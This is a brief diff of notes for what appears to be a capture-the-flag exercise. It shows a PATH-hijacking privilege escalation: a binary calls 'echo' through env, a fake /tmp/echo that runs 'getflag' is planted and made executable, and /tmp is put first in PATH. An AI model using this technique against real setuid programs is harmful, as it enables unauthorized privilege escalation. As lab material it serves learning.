@@ -1,0 +1,4 @@
+https://dogbolt.org/ -> return system("/usr/bin/env echo Exploit me");
+echo "getflag" > /tmp/echo
+chmod +x /tmp/echo
+export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:sbin:/bin:/usr/games
